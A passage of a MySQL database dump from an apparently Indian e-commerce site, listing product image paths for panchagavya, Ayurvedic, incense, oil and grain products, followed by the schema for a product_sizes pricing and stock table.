(19, 17, 1, 'assets/images/saptharangi-ark101658485901.jpg', 'assets/images/saptharangi-ark200x24001658485901.jpg', 'assets/images/saptharangi-ark400x40001658485901.jpg', 'assets/images/saptharangi-ark800x80001658485901.jpg', 0, 1, '2022-04-07 04:19:06', '2022-08-03 05:11:27', '0'),
(20, 18, 1, 'assets/images/pashanabedh-ark101658485835.jpg', 'assets/images/pashanabedh-ark200x24001658485835.jpg', 'assets/images/pashanabedh-ark400x40001658485835.jpg', 'assets/images/pashanabedh-ark800x80001658485835.jpg', 0, 1, '2022-04-07 04:21:21', '2022-08-03 05:11:53', '0'),
(21, 19, 1, './assets/images/nandi-ark101649305988.jpg', './assets/images/nandi-ark200x24001649305988.jpg', './assets/images/nandi-ark400x40001649305988.jpg', './assets/images/nandi-ark800x80001649305988.jpg', 0, 1, '2022-04-07 04:33:08', '2022-08-03 05:12:32', '0'),
(22, 20, 1, 'assets/images/giloya-ark101658485581.jpg', 'assets/images/giloya-ark200x24001658485581.jpg', 'assets/images/giloya-ark400x40001658485581.jpg', 'assets/images/giloya-ark800x80001658485581.jpg', 0, 1, '2022-04-07 04:37:23', '2022-08-03 05:12:58', '0'),
(23, 21, 1, './assets/images/arjuna-ark101649306412.jpg', './assets/images/arjuna-ark200x24001649306412.jpg', './assets/images/arjuna-ark400x40001649306412.jpg', './assets/images/arjuna-ark800x80001649306412.jpg', 0, 1, '2022-04-07 04:40:12', '2022-08-03 05:13:54', '0'),
(24, 22, 1, 'assets/images/tulsi-ark101658486009.jpg', 'assets/images/tulsi-ark200x24001658486009.jpg', 'assets/images/tulsi-ark400x40001658486009.jpg', 'assets/images/tulsi-ark800x80001658486009.jpg', 0, 1, '2022-04-07 04:43:24', '2022-08-03 05:14:42', '0'),
(25, 23, 1, './assets/images/punarnava-ark101649306839.jpg', './assets/images/punarnava-ark200x24001649306839.jpg', './assets/images/punarnava-ark400x40001649306839.jpg', './assets/images/punarnava-ark800x80001649306839.jpg', 0, 1, '2022-04-07 04:47:19', '2022-08-03 05:17:42', '0'),
(26, 24, 1, './assets/images/harisingar-ark101649306986.jpg', './assets/images/harisingar-ark200x24001649306986.jpg', './assets/images/harisingar-ark400x40001649306986.jpg', './assets/images/harisingar-ark800x80001649306986.jpg', 0, 1, '2022-04-07 04:49:46', '2022-11-11 11:00:19', '0'),
(27, 25, 1, './assets/images/chandrama-ark101649307139.jpg', './assets/images/chandrama-ark200x24001649307139.jpg', './assets/images/chandrama-ark400x40001649307139.jpg', './assets/images/chandrama-ark800x80001649307139.jpg', 0, 1, '2022-04-07 04:52:19', '2022-11-11 11:00:05', '0'),
(28, 26, 1, 'assets/images/sanjeevani-vati-aagd101649313120.png', 'assets/images/sanjeevani-vati-aagd200x24001649313120.png', 'assets/images/sanjeevani-vati-aagd400x40001649313120.png', 'assets/images/sanjeevani-vati-aagd800x80001649313120.png', 0, 1, '2022-04-07 05:59:48', '2022-04-12 12:02:42', '0'),
(29, 27, 1, 'assets/images/sarphagandha-ghanavati101649313394.png', 'assets/images/sarphagandha-ghanavati200x24001649313394.png', 'assets/images/sarphagandha-ghanavati400x40001649313394.png', 'assets/images/sarphagandha-ghanavati800x80001649313394.png', 0, 1, '2022-04-07 06:03:42', '2022-04-12 10:51:44', '0'),
(30, 28, 1, 'assets/images/saptharangi-ghanavati101649313284.png', 'assets/images/saptharangi-ghanavati200x24001649313284.png', 'assets/images/saptharangi-ghanavati400x40001649313284.png', 'assets/images/saptharangi-ghanavati800x80001649313284.png', 0, 1, '2022-04-07 06:05:13', '2022-04-12 10:49:57', '0'),
(31, 29, 1, 'assets/images/panchagavya-ghanavati101649313014.png', 'assets/images/panchagavya-ghanavati200x24001649313014.png', 'assets/images/panchagavya-ghanavati400x40001649313014.png', 'assets/images/panchagavya-ghanavati800x80001649313014.png', 0, 1, '2022-04-07 06:07:51', '2022-06-01 10:23:22', '0'),
(32, 30, 1, '0', '0', '0', '0', 0, 1, '2022-04-07 06:11:33', '2022-04-12 10:39:49', '0'),
(33, 31, 1, '0', '0', '0', '0', 0, 1, '2022-04-07 06:14:30', '2022-04-12 10:37:40', '0'),
(34, 32, 1, '0', '0', '0', '0', 0, 1, '2022-04-07 06:16:02', '2022-06-15 12:15:16', '0'),
(35, 33, 1, '0', '0', '0', '0', 0, 1, '2022-04-07 06:17:41', '2022-04-12 10:32:10', '0'),
(36, 34, 1, '0', '0', '0', '0', 0, 1, '2022-04-07 06:19:17', '2022-04-12 10:29:50', '0'),
(37, 35, 1, '0', '0', '0', '0', 0, 1, '2022-04-07 06:22:11', '2022-04-12 10:28:22', '0'),
(38, 36, 1, './assets/images/gavya-madhu-meha-churna101649314116.jpg', './assets/images/gavya-madhu-meha-churna200x24001649314116.jpg', './assets/images/gavya-madhu-meha-churna400x40001649314116.jpg', './assets/images/gavya-madhu-meha-churna800x80001649314116.jpg', 0, 1, '2022-04-07 06:48:36', '2022-04-13 09:38:35', '0'),
(39, 37, 1, 'assets/images/gavya-triphala-churna101649314477.jpg', 'assets/images/gavya-triphala-churna200x24001649314477.jpg', 'assets/images/gavya-triphala-churna400x40001649314477.jpg', 'assets/images/gavya-triphala-churna800x80001649314477.jpg', 0, 1, '2022-04-07 06:52:23', '2022-04-13 09:37:16', '0'),
(40, 38, 1, './assets/images/gavya-pitta-shamana-churna101649314695.jpg', './assets/images/gavya-pitta-shamana-churna200x24001649314695.jpg', './assets/images/gavya-pitta-shamana-churna400x40001649314695.jpg', './assets/images/gavya-pitta-shamana-churna800x80001649314695.jpg', 0, 1, '2022-04-07 06:58:15', '2022-04-13 09:33:54', '0'),
(41, 39, 1, './assets/images/spiriual-basma101649314930.jpg', './assets/images/spiriual-basma200x24001649314930.jpg', './assets/images/spiriual-basma400x40001649314930.jpg', './assets/images/spiriual-basma800x80001649314930.jpg', 0, 1, '2022-04-07 07:02:10', '2022-04-13 09:32:22', '0'),
(42, 40, 1, './assets/images/panchagavya-facial-powder101649315520.jpg', './assets/images/panchagavya-facial-powder200x24001649315520.jpg', './assets/images/panchagavya-facial-powder400x40001649315520.jpg', './assets/images/panchagavya-facial-powder800x80001649315520.jpg', 0, 1, '2022-04-07 07:12:00', '2022-07-18 10:25:25', '0'),
(43, 41, 1, './assets/images/panchagavya-snana-churna101649316236.jpg', './assets/images/panchagavya-snana-churna200x24001649316236.jpg', './assets/images/panchagavya-snana-churna400x40001649316236.jpg', './assets/images/panchagavya-snana-churna800x80001649316236.jpg', 0, 1, '2022-04-07 07:23:56', '2022-07-26 12:15:25', '0'),
(44, 42, 1, 'assets/images/gomayadi-dantamanjan101658519499.jpg', 'assets/images/gomayadi-dantamanjan200x24001658519499.jpg', 'assets/images/gomayadi-dantamanjan400x40001658519499.jpg', 'assets/images/gomayadi-dantamanjan800x80001658519499.jpg', 0, 1, '2022-04-07 07:27:45', '2022-08-03 05:23:05', '0'),
(45, 43, 1, './assets/images/panchagavya-soap101649316708.jpg', './assets/images/panchagavya-soap200x24001649316708.jpg', './assets/images/panchagavya-soap400x40001649316708.jpg', './assets/images/panchagavya-soap800x80001649316708.jpg', 0, 1, '2022-04-07 07:31:48', '2022-07-27 06:14:26', '0'),
(46, 44, 1, './assets/images/panchagavya-shampoo101649317349.jpg', './assets/images/panchagavya-shampoo200x24001649317349.jpg', './assets/images/panchagavya-shampoo400x40001649317349.jpg', './assets/images/panchagavya-shampoo800x80001649317349.jpg', 0, 1, '2022-04-07 07:42:29', '2022-07-27 06:05:10', '0'),
(47, 45, 1, '0', '0', '0', '0', 0, 1, '2022-04-07 07:45:01', '2022-07-18 10:26:14', '0'),
(48, 46, 1, 'assets/images/cow-dung-cake101658519400.jpg', 'assets/images/cow-dung-cake200x24001658519400.jpg', 'assets/images/cow-dung-cake400x40001658519400.jpg', 'assets/images/cow-dung-cake800x80001658519400.jpg', 0, 1, '2022-04-07 08:55:00', '2022-11-22 10:05:13', '0'),
(49, 47, 1, 'assets/images/ghanajeevamrtha101658519640.jpg', 'assets/images/ghanajeevamrtha200x24001658519640.jpg', 'assets/images/ghanajeevamrtha400x40001658519640.jpg', 'assets/images/ghanajeevamrtha800x80001658519640.jpg', 0, 1, '2022-04-07 08:59:17', '2022-08-03 05:41:45', '0'),
(50, 48, 1, './assets/images/vermicompost-powder101649322309.jpg', './assets/images/vermicompost-powder200x24001649322309.jpg', './assets/images/vermicompost-powder400x40001649322309.jpg', './assets/images/vermicompost-powder800x80001649322309.jpg', 0, 1, '2022-04-07 09:05:09', '2022-08-03 05:40:09', '0'),
(51, 49, 1, 'assets/images/pest-control101658519778.jpg', 'assets/images/pest-control200x24001658519778.jpg', 'assets/images/pest-control400x40001658519778.jpg', 'assets/images/pest-control800x80001658519778.jpg', 0, 1, '2022-04-07 09:11:49', '2022-08-03 05:40:51', '0'),
(52, 50, 1, 'assets/images/jeeva-amrutha101658519687.jpg', 'assets/images/jeeva-amrutha200x24001658519687.jpg', 'assets/images/jeeva-amrutha400x40001658519687.jpg', 'assets/images/jeeva-amrutha800x80001658519687.jpg', 0, 1, '2022-04-07 09:15:07', '2022-08-03 05:41:14', '0'),
(53, 51, 1, '0', '0', '0', '0', 0, 1, '2022-04-07 09:17:30', '2022-07-18 10:28:23', '0'),
(54, 52, 1, './assets/images/abhyangha-taila101649324345.jpg', './assets/images/abhyangha-taila200x24001649324345.jpg', './assets/images/abhyangha-taila400x40001649324345.jpg', './assets/images/abhyangha-taila800x80001649324345.jpg', 0, 1, '2022-04-07 09:39:05', '2022-08-03 05:24:44', '0'),
(55, 53, 1, 'assets/images/pain-relief-oil101658519811.jpg', 'assets/images/pain-relief-oil200x24001658519811.jpg', 'assets/images/pain-relief-oil400x40001658519811.jpg', 'assets/images/pain-relief-oil800x80001658519811.jpg', 0, 1, '2022-04-07 09:43:11', '2022-08-03 05:25:20', '0'),
(56, 54, 1, './assets/images/universal-relief-oil101649325156.jpg', './assets/images/universal-relief-oil200x24001649325156.jpg', './assets/images/universal-relief-oil400x40001649325156.jpg', './assets/images/universal-relief-oil800x80001649325156.jpg', 0, 1, '2022-04-07 09:52:36', '2022-08-03 05:36:17', '0'),
(57, 55, 1, './assets/images/dasharathana-oil101649325505.jpg', './assets/images/dasharathana-oil200x24001649325505.jpg', './assets/images/dasharathana-oil400x40001649325505.jpg', './assets/images/dasharathana-oil800x80001649325505.jpg', 0, 1, '2022-04-07 09:58:25', '2022-08-03 05:36:38', '0'),
(58, 56, 1, 'assets/images/skin-ointment101658519842.jpg', 'assets/images/skin-ointment200x24001658519842.jpg', 'assets/images/skin-ointment400x40001658519842.jpg', 'assets/images/skin-ointment800x80001658519842.jpg', 0, 1, '2022-04-07 10:04:06', '2022-08-03 05:37:02', '0'),
(59, 57, 1, 'assets/images/panchagavya-ear-drops101658812413.jpg', 'assets/images/panchagavya-ear-drops200x24001658812413.jpg', 'assets/images/panchagavya-ear-drops400x40001658812413.jpg', 'assets/images/panchagavya-ear-drops800x80001658812413.jpg', 0, 1, '2022-04-07 10:06:06', '2022-08-03 05:37:26', '0'),
(60, 58, 1, 'assets/images/panchagavya-eye-drops101658812447.jpg', 'assets/images/panchagavya-eye-drops200x24001658812447.jpg', 'assets/images/panchagavya-eye-drops400x40001658812447.jpg', 'assets/images/panchagavya-eye-drops800x80001658812447.jpg', 0, 1, '2022-04-07 10:12:33', '2022-08-03 05:37:55', '0'),
(61, 59, 1, 'assets/images/panchagavya-nasike-drops101658812481.jpg', 'assets/images/panchagavya-nasike-drops200x24001658812481.jpg', 'assets/images/panchagavya-nasike-drops400x40001658812481.jpg', 'assets/images/panchagavya-nasike-drops800x80001658812481.jpg', 0, 1, '2022-04-07 10:15:46', '2022-07-26 05:14:41', '0'),
(62, 60, 1, 'assets/images/panchagavya-pain-relief-oil101658519737.jpg', 'assets/images/panchagavya-pain-relief-oil200x24001658519737.jpg', 'assets/images/panchagavya-pain-relief-oil400x40001658519737.jpg', 'assets/images/panchagavya-pain-relief-oil800x80001658519737.jpg', 0, 1, '2022-04-07 10:18:23', '2022-08-03 05:38:19', '0'),
(63, 61, 1, '0', '0', '0', '0', 0, 1, '2022-04-07 10:20:38', '2022-07-18 10:27:35', '0'),
(64, 62, 1, './assets/images/castrol-oil101649333329.jpg', './assets/images/castrol-oil200x24001649333329.jpg', './assets/images/castrol-oil400x40001649333329.jpg', './assets/images/castrol-oil800x80001649333329.jpg', 0, 1, '2022-04-07 12:08:49', '2022-04-14 04:33:51', '0'),
(65, 63, 1, './assets/images/seasame-oil101649333535.jpg', './assets/images/seasame-oil200x24001649333535.jpg', './assets/images/seasame-oil400x40001649333535.jpg', './assets/images/seasame-oil800x80001649333535.jpg', 0, 1, '2022-04-07 12:12:15', '2022-04-14 04:33:02', '0'),
(66, 64, 1, './assets/images/coconut-oil101649333734.jpg', './assets/images/coconut-oil200x24001649333734.jpg', './assets/images/coconut-oil400x40001649333734.jpg', './assets/images/coconut-oil800x80001649333734.jpg', 0, 1, '2022-04-07 12:15:34', '2022-04-14 04:32:17', '0'),
(67, 65, 1, './assets/images/ground-nut-oil101649333926.jpg', './assets/images/ground-nut-oil200x24001649333926.jpg', './assets/images/ground-nut-oil400x40001649333926.jpg', './assets/images/ground-nut-oil800x80001649333926.jpg', 0, 1, '2022-04-07 12:18:46', '2022-04-14 04:31:25', '0'),
(68, 66, 1, '0', '0', '0', '0', 0, 1, '2022-04-07 12:23:26', '2022-04-14 04:29:18', '0'),
(69, 67, 1, '0', '0', '0', '0', 0, 1, '2022-04-07 12:26:04', '2022-04-14 04:27:36', '0'),
(70, 68, 1, '0', '0', '0', '0', 0, 1, '2022-04-07 12:29:11', '2022-04-07 12:29:11', '0'),
(71, 69, 1, 'assets/images/milk101649390667.jpg', 'assets/images/milk200x24001649390667.jpg', 'assets/images/milk400x40001649390667.jpg', 'assets/images/milk800x80001649390667.jpg', 0, 1, '2022-04-08 04:02:23', '2022-04-08 04:05:54', '0'),
(72, 70, 1, '0', '0', '0', '0', 0, 1, '2022-04-08 04:09:09', '2022-04-08 04:09:09', '0'),
(73, 71, 1, '0', '0', '0', '0', 0, 1, '2022-04-08 04:11:21', '2022-04-08 04:11:21', '0'),
(74, 72, 1, './assets/images/milk-powder101649391383.jpg', './assets/images/milk-powder200x24001649391383.jpg', './assets/images/milk-powder400x40001649391383.jpg', './assets/images/milk-powder800x80001649391383.jpg', 0, 1, '2022-04-08 04:16:23', '2022-06-02 09:57:20', '0'),
(75, 73, 1, './assets/images/paneer101649391686.jpg', './assets/images/paneer200x24001649391686.jpg', './assets/images/paneer400x40001649391686.jpg', './assets/images/paneer800x80001649391686.jpg', 0, 1, '2022-04-08 04:21:26', '2022-06-02 09:54:49', '0'),
(76, 74, 1, '0', '0', '0', '0', 0, 1, '2022-04-08 04:25:22', '2022-06-02 10:01:54', '0'),
(77, 75, 1, './assets/images/curd-1101649392049.jpg', './assets/images/curd-1200x24001649392049.jpg', './assets/images/curd-1400x40001649392049.jpg', './assets/images/curd-1800x80001649392049.jpg', 0, 1, '2022-04-08 04:27:29', '2022-06-07 04:52:18', '0'),
(78, 76, 1, 'assets/images/diyas101658726810.jpg', 'assets/images/diyas200x24001658726810.jpg', 'assets/images/diyas400x40001658726810.jpg', 'assets/images/diyas800x80001658726810.jpg', 0, 1, '2022-04-08 04:36:11', '2022-11-11 10:57:16', '0'),
(79, 77, 1, 'assets/images/dhoop-sticks101664455906.jpg', 'assets/images/dhoop-sticks200x24001664455906.jpg', 'assets/images/dhoop-sticks400x40001664455906.jpg', 'assets/images/dhoop-sticks800x80001664455906.jpg', 0, 1, '2022-04-08 04:44:05', '2022-11-07 12:36:06', '0'),
(80, 78, 1, '0', '0', '0', '0', 0, 1, '2022-04-08 04:47:03', '2022-06-02 10:31:13', '0'),
(81, 79, 1, 'assets/images/vibhoothi101649840330.jpg', 'assets/images/vibhoothi200x24001649840330.jpg', 'assets/images/vibhoothi400x40001649840330.jpg', 'assets/images/vibhoothi800x80001649840330.jpg', 0, 1, '2022-04-08 04:48:15', '2022-06-02 10:34:16', '0'),
(82, 80, 1, '0', '0', '0', '0', 0, 1, '2022-04-08 04:49:34', '2022-06-02 10:36:05', '0'),
(83, 81, 1, '0', '0', '0', '0', 0, 1, '2022-04-08 04:50:53', '2022-04-08 05:13:31', '0'),
(84, 82, 1, 'assets/images/cowdung-sambrani-cups101658519431.jpg', 'assets/images/cowdung-sambrani-cups200x24001658519431.jpg', 'assets/images/cowdung-sambrani-cups400x40001658519431.jpg', 'assets/images/cowdung-sambrani-cups800x80001658519431.jpg', 0, 1, '2022-04-08 04:52:18', '2022-10-27 11:54:24', '0'),
(85, 83, 1, '0', '0', '0', '0', 0, 1, '2022-04-08 09:35:06', '2022-06-02 10:10:58', '0'),
(86, 84, 1, '0', '0', '0', '0', 0, 1, '2022-04-08 09:42:25', '2022-07-18 10:28:42', '0'),
(87, 85, 1, '0', '0', '0', '0', 0, 1, '2022-04-08 09:46:11', '2022-04-08 09:46:11', '0'),
(88, 86, 1, '0', '0', '0', '0', 0, 1, '2022-04-08 09:50:07', '2022-07-16 10:24:09', '0'),
(89, 87, 1, '0', '0', '0', '0', 0, 1, '2022-04-08 10:00:12', '2022-06-02 10:15:34', '0'),
(90, 88, 1, '0', '0', '0', '0', 0, 1, '2022-06-27 06:27:24', '2022-07-14 07:24:45', '0'),
(91, 89, 1, 'assets/images/chandan-sambrani-cone101664455664.jpg', 'assets/images/chandan-sambrani-cone200x24001664455664.jpg', 'assets/images/chandan-sambrani-cone400x40001664455664.jpg', 'assets/images/chandan-sambrani-cone800x80001664455664.jpg', 0, 1, '2022-07-18 05:51:42', '2022-11-07 12:16:03', '0'),
(92, 90, 1, '0', '0', '0', '0', 0, 1, '2022-07-18 06:30:13', '2022-07-18 06:30:13', '0'),
(93, 91, 1, 'assets/images/gou-clean-phenoyl101658519577.jpg', 'assets/images/gou-clean-phenoyl200x24001658519577.jpg', 'assets/images/gou-clean-phenoyl400x40001658519577.jpg', 'assets/images/gou-clean-phenoyl800x80001658519577.jpg', 0, 1, '2022-07-18 06:36:26', '2022-11-15 05:39:02', '0'),
(94, 92, 1, '0', '0', '0', '0', 0, 1, '2022-07-18 07:06:27', '2022-07-18 07:07:46', '0'),
(95, 93, 1, '0', '0', '0', '0', 0, 1, '2022-07-18 07:15:20', '2022-07-18 07:25:04', '0'),
(96, 94, 1, '0', '0', '0', '0', 0, 1, '2022-07-18 07:23:24', '2022-07-18 07:47:27', '0'),
(97, 95, 1, 'assets/images/incense-sambrani-cone101664455639.jpg', 'assets/images/incense-sambrani-cone200x24001664455639.jpg', 'assets/images/incense-sambrani-cone400x40001664455639.jpg', 'assets/images/incense-sambrani-cone800x80001664455639.jpg', 0, 1, '2022-07-18 07:30:32', '2022-10-27 12:07:03', '0'),
(98, 96, 1, '0', '0', '0', '0', 0, 1, '2022-07-18 07:31:54', '2022-07-18 07:32:22', '0'),
(99, 97, 1, '0', '0', '0', '0', 0, 1, '2022-07-18 08:30:59', '2022-07-18 08:35:48', '0'),
(100, 98, 1, '0', '0', '0', '0', 0, 1, '2022-07-18 08:44:46', '2022-07-18 10:00:39', '0'),
(101, 99, 1, 'assets/images/mogra-dhoop-sticks101664455870.jpg', 'assets/images/mogra-dhoop-sticks200x24001664455870.jpg', 'assets/images/mogra-dhoop-sticks400x40001664455870.jpg', 'assets/images/mogra-dhoop-sticks800x80001664455870.jpg', 0, 1, '2022-07-18 08:57:36', '2022-10-27 12:10:53', '0'),
(102, 100, 1, 'assets/images/loban-dhoop-sticks101664455841.jpg', 'assets/images/loban-dhoop-sticks200x24001664455841.jpg', 'assets/images/loban-dhoop-sticks400x40001664455841.jpg', 'assets/images/loban-dhoop-sticks800x80001664455841.jpg', 0, 1, '2022-07-18 09:01:42', '2022-11-07 12:35:17', '0'),
(103, 101, 1, 'assets/images/godhan-dhoop-sticks101664455817.jpg', 'assets/images/godhan-dhoop-sticks200x24001664455817.jpg', 'assets/images/godhan-dhoop-sticks400x40001664455817.jpg', 'assets/images/godhan-dhoop-sticks800x80001664455817.jpg', 0, 1, '2022-07-18 09:12:18', '2022-10-27 11:58:43', '0'),
(104, 102, 1, 'assets/images/lavendar-dhoop-sticks101664455789.jpg', 'assets/images/lavendar-dhoop-sticks200x24001664455789.jpg', 'assets/images/lavendar-dhoop-sticks400x40001664455789.jpg', 'assets/images/lavendar-dhoop-sticks800x80001664455789.jpg', 0, 1, '2022-07-18 09:16:52', '2022-11-07 12:35:44', '0'),
(105, 103, 1, 'assets/images/chandan-dhoop-sticks101664455764.jpg', 'assets/images/chandan-dhoop-sticks200x24001664455764.jpg', 'assets/images/chandan-dhoop-sticks400x40001664455764.jpg', 'assets/images/chandan-dhoop-sticks800x80001664455764.jpg', 0, 1, '2022-07-18 09:21:47', '2022-11-07 12:32:50', '0'),
(106, 104, 1, 'assets/images/gulab-dhoop-sticks101664455739.jpg', 'assets/images/gulab-dhoop-sticks200x24001664455739.jpg', 'assets/images/gulab-dhoop-sticks400x40001664455739.jpg', 'assets/images/gulab-dhoop-sticks800x80001664455739.jpg', 0, 1, '2022-07-18 09:26:03', '2022-11-07 12:34:18', '0'),
(107, 105, 1, 'assets/images/jasmine-dhoop-sticks101664455714.jpg', 'assets/images/jasmine-dhoop-sticks200x24001664455714.jpg', 'assets/images/jasmine-dhoop-sticks400x40001664455714.jpg', 'assets/images/jasmine-dhoop-sticks800x80001664455714.jpg', 0, 1, '2022-07-18 09:30:43', '2022-11-07 12:36:50', '0'),
(108, 106, 1, 'assets/images/gugle-dhoop-sticks101664455691.jpg', 'assets/images/gugle-dhoop-sticks200x24001664455691.jpg', 'assets/images/gugle-dhoop-sticks400x40001664455691.jpg', 'assets/images/gugle-dhoop-sticks800x80001664455691.jpg', 0, 1, '2022-07-18 09:35:52', '2022-11-07 12:33:33', '0'),
(109, 107, 1, '0', '0', '0', '0', 0, 1, '2022-07-18 09:48:35', '2022-07-18 09:56:51', '0'),
(110, 108, 1, 'assets/images/homa-kunda101658729457.jpg', 'assets/images/homa-kunda200x24001658729457.jpg', 'assets/images/homa-kunda400x40001658729457.jpg', 'assets/images/homa-kunda800x80001658729457.jpg', 0, 1, '2022-07-18 10:17:04', '2022-11-08 05:38:39', '0'),
(111, 109, 1, 'assets/images/gugler-sambrani-cone101664455615.jpg', 'assets/images/gugler-sambrani-cone200x24001664455615.jpg', 'assets/images/gugler-sambrani-cone400x40001664455615.jpg', 'assets/images/gugler-sambrani-cone800x80001664455615.jpg', 0, 1, '2022-07-18 10:43:28', '2022-11-07 12:22:04', '0'),
(112, 110, 1, 'assets/images/gulab-sambrani-cone101664455589.jpg', 'assets/images/gulab-sambrani-cone200x24001664455589.jpg', 'assets/images/gulab-sambrani-cone400x40001664455589.jpg', 'assets/images/gulab-sambrani-cone800x80001664455589.jpg', 0, 1, '2022-07-18 10:45:17', '2022-11-07 12:22:31', '0'),
(113, 111, 1, './assets/images/dmeo101658141386.jpg', './assets/images/dmeo200x24001658141386.jpg', './assets/images/dmeo400x40001658141386.jpg', './assets/images/dmeo800x80001658141386.jpg', 0, 1, '2022-07-18 10:49:46', '2022-07-18 10:49:46', '0'),
(114, 112, 1, 'assets/images/loban-sambrani-cone101664455566.jpg', 'assets/images/loban-sambrani-cone200x24001664455566.jpg', 'assets/images/loban-sambrani-cone400x40001664455566.jpg', 'assets/images/loban-sambrani-cone800x80001664455566.jpg', 0, 1, '2022-07-18 10:51:42', '2022-11-07 12:23:22', '0'),
(115, 113, 1, 'assets/images/mogra-sambrani-cone101664455536.jpg', 'assets/images/mogra-sambrani-cone200x24001664455536.jpg', 'assets/images/mogra-sambrani-cone400x40001664455536.jpg', 'assets/images/mogra-sambrani-cone800x80001664455536.jpg', 0, 1, '2022-07-18 10:54:33', '2022-11-07 12:37:12', '0'),
(116, 114, 1, 'assets/images/cowdung-ghee-batti101658728604.jpg', 'assets/images/cowdung-ghee-batti200x24001658728604.jpg', 'assets/images/cowdung-ghee-batti400x40001658728604.jpg', 'assets/images/cowdung-ghee-batti800x80001658728604.jpg', 0, 1, '2022-07-20 07:18:52', '2022-11-11 10:57:34', '0'),
(117, 115, 1, './assets/images/black-rice101659504837.jpg', './assets/images/black-rice200x24001659504837.jpg', './assets/images/black-rice400x40001659504837.jpg', './assets/images/black-rice800x80001659504837.jpg', 0, 1, '2022-08-03 05:33:57', '2022-08-10 06:34:21', '0'),
(118, 116, 1, './assets/images/long-grain-white-rice101659504913.jpg', './assets/images/long-grain-white-rice200x24001659504913.jpg', './assets/images/long-grain-white-rice400x40001659504913.jpg', './assets/images/long-grain-white-rice800x80001659504913.jpg', 0, 1, '2022-08-03 05:35:13', '2022-08-10 06:35:06', '0'),
(119, 117, 1, './assets/images/parboiled-rice101659504958.jpg', './assets/images/parboiled-rice200x24001659504958.jpg', './assets/images/parboiled-rice400x40001659504958.jpg', './assets/images/parboiled-rice800x80001659504958.jpg', 0, 1, '2022-08-03 05:35:58', '2022-08-10 06:36:00', '0'),
(120, 118, 1, './assets/images/red-adzuki-beans101659520479.jpg', './assets/images/red-adzuki-beans200x24001659520479.jpg', './assets/images/red-adzuki-beans400x40001659520479.jpg', './assets/images/red-adzuki-beans800x80001659520479.jpg', 0, 1, '2022-08-03 09:54:39', '2022-08-10 06:37:48', '0'),
(121, 119, 1, './assets/images/red-organic-kidney-beans101659520525.jpg', './assets/images/red-organic-kidney-beans200x24001659520525.jpg', './assets/images/red-organic-kidney-beans400x40001659520525.jpg', './assets/images/red-organic-kidney-beans800x80001659520525.jpg', 0, 1, '2022-08-03 09:55:25', '2022-08-10 06:39:22', '0'),
(122, 120, 1, './assets/images/soya-beans101659520721.jpg', './assets/images/soya-beans200x24001659520721.jpg', './assets/images/soya-beans400x40001659520721.jpg', './assets/images/soya-beans800x80001659520721.jpg', 0, 1, '2022-08-03 09:58:41', '2022-08-10 06:43:18', '0'),
(123, 121, 1, './assets/images/wheat101659526423.jpg', './assets/images/wheat200x24001659526423.jpg', './assets/images/wheat400x40001659526423.jpg', './assets/images/wheat800x80001659526423.jpg', 0, 1, '2022-08-03 11:33:43', '2022-08-10 06:46:04', '0'),
(124, 122, 1, './assets/images/green-buckwheat101659526472.jpg', './assets/images/green-buckwheat200x24001659526472.jpg', './assets/images/green-buckwheat400x40001659526472.jpg', './assets/images/green-buckwheat800x80001659526472.jpg', 0, 1, '2022-08-03 11:34:32', '2022-08-10 06:47:43', '0'),
(125, 123, 1, './assets/images/corn101659526517.jpg', './assets/images/corn200x24001659526517.jpg', './assets/images/corn400x40001659526517.jpg', './assets/images/corn800x80001659526517.jpg', 0, 1, '2022-08-03 11:35:17', '2022-09-26 11:27:46', '0'),
(126, 124, 1, '0', '0', '0', '0', 0, 1, '2022-09-26 09:53:47', '2022-09-26 09:53:47', '0'),
(127, 125, 1, 'assets/images/demo101664271595.jpg', 'assets/images/demo200x24001664271595.jpg', 'assets/images/demo400x40001664271595.jpg', 'assets/images/demo800x80001664271595.jpg', 0, 1, '2022-09-26 11:28:27', '2022-09-27 10:11:48', '0'),
(128, 125, 1, 'assets/images/demo111664272978.jpg', 'assets/images/demo200x24011664272978.jpg', 'assets/images/demo400x40011664272978.jpg', 'assets/images/demo800x80011664273000.jpg', 0, 1, '2022-09-27 10:02:58', '2022-09-27 10:11:48', ''),
(129, 126, 1, 'assets/images/ghee-diya101668160413.jpg', 'assets/images/ghee-diya200x24001668160413.jpg', 'assets/images/ghee-diya400x40001668160413.jpg', 'assets/images/ghee-diya800x80001668160413.jpg', 0, 1, '2022-11-08 07:30:02', '2022-11-11 10:58:58', '0'),
(130, 127, 1, '0', '0', '0', '0', 0, 1, '2022-11-11 10:08:46', '2022-11-11 10:08:46', '0'),
(131, 128, 1, '0', '0', '0', '0', 0, 1, '2022-11-11 10:10:49', '2022-11-11 10:10:49', '0'),
(132, 129, 1, '0', '0', '0', '0', 0, 1, '2022-11-11 10:19:02', '2022-11-11 10:19:02', '0'),
(133, 130, 1, './assets/images/panchagavya-diyas-single-diya101668164103.jpg', './assets/images/panchagavya-diyas-single-diya200x24001668164103.jpg', './assets/images/panchagavya-diyas-single-diya400x40001668164103.jpg', './assets/images/panchagavya-diyas-single-diya800x80001668164103.jpg', 0, 1, '2022-11-11 10:55:03', '2022-11-15 05:41:47', '0'),
(134, 131, 1, './assets/images/scented-gou-clean-phenoyl101668490884.jpg', './assets/images/scented-gou-clean-phenoyl200x24001668490884.jpg', './assets/images/scented-gou-clean-phenoyl400x40001668490884.jpg', './assets/images/scented-gou-clean-phenoyl800x80001668490884.jpg', 0, 1, '2022-11-15 05:41:24', '2022-11-15 05:41:39', '0'),
(135, 132, 1, './assets/images/mosquito-repellent101669112041.jpg', './assets/images/mosquito-repellent200x24001669112041.jpg', './assets/images/mosquito-repellent400x40001669112041.jpg', './assets/images/mosquito-repellent800x80001669112041.jpg', 0, 1, '2022-11-22 10:14:01', '2022-11-22 10:15:41', '0');

-- --------------------------------------------------------

--
-- Table structure for table `product_sizes`
--

CREATE TABLE `product_sizes` (
  `id` int(11) NOT NULL,
  `pid` int(11) NOT NULL,
  `size_id` int(11) NOT NULL,
  `mrp` float NOT NULL,
  `selling_price` float NOT NULL,
  `sel_dollar` float NOT NULL,
  `b2b_selling_price` float NOT NULL,
  `b2b_sel_dollar` float NOT NULL,
  `stock` int(11) NOT NULL,
  `minimum_buy` int(11) NOT NULL,
  `status` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `created_date` datetime NOT NULL,
  `modified_date` datetime NOT NULL,
  `image` varchar(255) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `product_sizes`
--

